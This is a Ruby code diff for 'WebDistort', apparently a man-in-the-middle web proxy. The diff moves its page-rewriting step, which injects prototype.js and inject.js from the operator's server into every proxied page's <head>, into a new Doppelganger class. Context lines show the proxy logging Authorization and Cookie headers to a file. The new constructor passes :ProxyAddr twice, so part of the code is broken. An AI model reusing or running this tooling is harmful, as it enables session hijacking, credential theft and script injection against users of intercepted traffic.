@@ -7,6 +7,7 @@ require "optparse"
 require "socket"
 require "webrick_override"
 require "pp"
+require "doppelganger"
 
 class WebDistort
  
@@ -22,35 +23,9 @@ class WebDistort
     @data_dir = Dir::pwd + '/saved'
     
     @options = nil
-    
-    def modify_body (body)
-			prototype_file = "http://" + @server_ip + ":" + @http_port.to_s + "/prototype.js"
-      js_file = "http://" + @server_ip + ":" + @http_port.to_s + "/inject.js"
 
-      search_string = '<head>'
-
-	#prototype_data_file = File.open(@http_root + "/prototype.js", "r");
-	#prototype_data = prototype_data_file.read
-
-      #js_data_file = File.open(@http_root + "/inject.js", "r")
-      #js_data = js_data_file.read
-      
-      replace_string = "<head><script language='javascript' src='" + prototype_file + "'></script><script language='javascript' src='" + js_file + "'></script>"
-      #replace_string = "<script language='javascript'>" + prototype_data + "</script>"
-#      puts replace_string
-      gsub_string = "/" + search_string + "/"
-#puts gsub_string
-     
-      modified_body = body.gsub(search_string, replace_string)
-      if modified_body != body
-        #puts "Successfully modified body!"
-        return modified_body
-      else
-        #puts "Body modification failed."
-        return body
-      end
-    end
-    
+	@doppelganger = nil
+        
     def initialize(o)
       @options = o
       
@@ -60,7 +35,18 @@ class WebDistort
       @proxy_port = @options['proxy_port']
       @server_ip = @options['server_ip']		
       @grab_all_headers = @options['grab_headers']
+
+	@doppelganger = Doppelganger.new(
+		:HttpdAddr => @server_ip,
+		:HttpdPort => @http_port,
+		:ProxyAddr => @server_ip,
+		:ProxyAddr => @proxy_port
+	)
     end
+
+	def doppelganger
+		@doppelganger
+	end
     
     def handle_contents(request, response)
 	puts request.host;
@@ -77,7 +63,7 @@ class WebDistort
         if @grab_all_headers || header_output =~ /Authorization/ || header_output =~ /Cookie/
           count =  $header_file.syswrite(header_output);	
         end        
-        return modify_body(response.body)
+        return @doppelganger.ModifyBody(response.body)
       else
         return response.body
       end
